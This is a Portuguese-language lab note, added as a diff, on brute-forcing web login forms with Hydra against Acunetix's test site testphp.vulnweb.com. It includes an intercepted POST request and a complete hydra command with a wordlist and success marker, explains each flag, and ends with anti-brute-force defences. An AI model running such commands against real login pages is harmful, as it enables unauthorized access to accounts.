@@ -1,0 +1,77 @@
+ ----------------------------------
+   Brutalforce em formulários web Usando Hydra:
+   site: acunetix 
+   - > http://testphp.vulnweb.com/userinfo.php (servidor que vamos atacar)
+   - > OPEN BURP SUIT
+   - > Firefox -> proxy - > 127.0.0.1:8080
+   
+   REQUEST IN FORM interceptada pelo burp: 
+  POST /userinfo.php HTTP/1.1
+  Host: testphp.vulnweb.com
+  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0  
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+  Referer: http://testphp.vulnweb.com/login.php
+  Cookie: login=test%2Ftest
+  uname=test&pass=test
+
+  nano acunetix.txt 
+  POST /userinfo.php HTTP/1.1
+  Host: testphp.vulnweb.com
+  uname=test&pass=test
+
+uname=test&pass=tes
+ 1 ) Precisamos conhecer a aplicação em POST 
+    - > fazer o cadastro na aplicação 
+    2 coisas de interesse: 
+    analisar a resposta de senhas erradas, como o servidor responde? "senha incorreta", "wrong passwords" etc...
+    analisar a resposta de login após logado dentro da aplicação.
+    Por que isso é importante?
+    - > Precisamos falar pro hydra a condição de parada. 
+    
+    Quais são as disponibilidades (inputs, interações) que a página oferece antes da efetuação de login e depois?
+    
+   exemplo:
+    usuário:afrogaara
+    senha: gaara
+    
+    return 
+    "senha incorreta" - > nano acunetix.txt 
+    
+   exemplo logado: 
+   usuário:afrogaara
+   senha: afrogaara
+   
+   HOME/LOGOUT/CARROS/USUÁRIO/CONFIGURAÇÕES - > resposta da aplicação 
+   
+hydra testphp.vulnweb.com -l test -P 10milion.txt http-post-form "/userinfo.php:uname=^USER^&pass=^PASS^:S=logout" -V
+
+testphp.vulnweb.com - > servidor a ser atacado 
+
+-l nome do login (usuário)
+-P lista de senhas 
+http-post-form - > brutalforce em formulários 
+"" - > especificação do formuláio 
+/userinfo.php: - > POST, página onde está o formulário 
+: - > separar parâmetros (separa o host do usuário e senha) 
+unane - > depende de como o site passa as informações de usuário e senha pro servidor 
+^USER^ - > use o usuário especificado pelo parâmetro -l 
+^PASS^: - > use a senha especificada pelo parâmetro -P ( no caso, a lista )
+: - > separar parâmetros (PASS)
+S=especificar algo que tenha na url após logado com login e senha 
+-V modo verbose 
+
+
+
+
+Evitando ataque de brutalforce em serviços: 
+
+- > Em primeiro lugar, serviços por mais atualizados que estejam estão vulneraveis a ataque de brutalforce
+- > Senhas fortes 
+- > Deixar portas restritas pra um determinado número de IP
+- > IDS OR IPS 
+- > Políticas de seguranças que restringem o ip após uma determinada tentativa de erros 
+
+Evitando ataque de brutalforce em formulários web:
+
+- > capcha 
+- > políticas de segurança pra restringir ip 
